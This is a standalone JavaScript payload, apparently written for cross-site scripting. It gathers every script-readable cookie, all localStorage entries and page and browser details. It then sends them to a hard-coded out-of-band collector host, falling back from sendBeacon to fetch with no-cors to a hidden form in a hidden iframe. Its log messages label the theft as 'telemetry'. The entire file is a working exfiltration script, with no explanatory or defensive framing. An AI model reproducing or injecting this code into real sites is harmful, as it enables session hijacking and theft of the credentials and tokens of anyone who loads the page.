// Cross-origin POST without CORS: sendBeacon -> fetch(no-cors) -> hidden <form>
// Collects page context, ALL JS-accessible cookies, and ALL localStorage entries.

(function () {
  // ===================== CONFIG =====================
  const LOG_ENDPOINT = "https://gfzwc6ij0kcow8y3ymilqi0xioofcg05.oastify.com"; // <- твой эндпоинт

  // ===================== COLLECT =====================
  function collectContext() {
    return {
      ts: new Date().toISOString(),
      origin: location.origin,
      href: location.href,
      path: location.pathname,
      search: location.search,
      hash: location.hash,
      referrer: document.referrer || "",
      ua: navigator.userAgent,
      lang: navigator.language,
      platform: navigator.platform,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
      viewport: { w: window.innerWidth, h: window.innerHeight },
      screen: {
        w: (screen && screen.width) || null,
        h: (screen && screen.height) || null,
        dpr: window.devicePixelRatio || 1
      }
    };
  }

  function parseCookies() {
    const raw = document.cookie || "";
    if (!raw) return { raw: "", entries: [], total: 0 };
    const entries = raw.split(/;\s*/).map(entry => {
      const i = entry.indexOf("=");
      const name = i === -1 ? entry : entry.slice(0, i);
      const value = i === -1 ? "" : entry.slice(i + 1);
      let dec = value;
      try { dec = decodeURIComponent(value); } catch {}
      return { name, value: dec };
    });
    return { raw, entries, total: entries.length };
  }

  function collectLocalStorage() {
    const entries = [];
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        entries.push({ key, value });
      }
    } catch {}
    return { entries, total: entries.length };
  }

  // ===================== SENDER =====================
  function postNoCors(endpoint, payloadObj) {
    const bodyStr = JSON.stringify(payloadObj);

    // 1) sendBeacon
    try {
      if (navigator.sendBeacon && endpoint.startsWith("https://")) {
        const blob = new Blob([bodyStr], { type: "text/plain;charset=UTF-8" });
        if (navigator.sendBeacon(endpoint, blob)) {
          console.log("[telemetry] sent via sendBeacon");
          return true;
        }
      }
    } catch (e) { console.warn("[telemetry] sendBeacon failed:", e); }

    // 2) fetch(no-cors)
    try {
      fetch(endpoint, {
        method: "POST",
        mode: "no-cors",
        keepalive: true,
        body: bodyStr
      }).catch(() => {});
      console.log("[telemetry] sent via fetch(no-cors) (opaque response)");
      return true;
    } catch (e) { console.warn("[telemetry] fetch failed:", e); }

    // 3) form + iframe
    try {
      const form = document.createElement("form");
      form.method = "POST";
      form.action = endpoint;
      form.style.display = "none";

      const ta = document.createElement("textarea");
      ta.name = "d";
      ta.value = bodyStr;
      form.appendChild(ta);

      const iframe = document.createElement("iframe");
      iframe.name = "telemetry_sink_" + Math.random().toString(36).slice(2);
      iframe.style.display = "none";

      document.body.appendChild(iframe);
      document.body.appendChild(form);
      form.target = iframe.name;
      form.submit();

      setTimeout(() => { try { iframe.remove(); form.remove(); } catch {} }, 3000);
      console.log("[telemetry] sent via form+iframe");
      return true;
    } catch (e) { console.warn("[telemetry] form+iframe failed:", e); }

    return false;
  }

  // ===================== BUILD & SEND =====================
  const payload = {
    kind: "client-telemetry",
    context: collectContext(),
    cookies: parseCookies(),
    localStorage: collectLocalStorage()
  };

  postNoCors(LOG_ENDPOINT, payload);
})();
  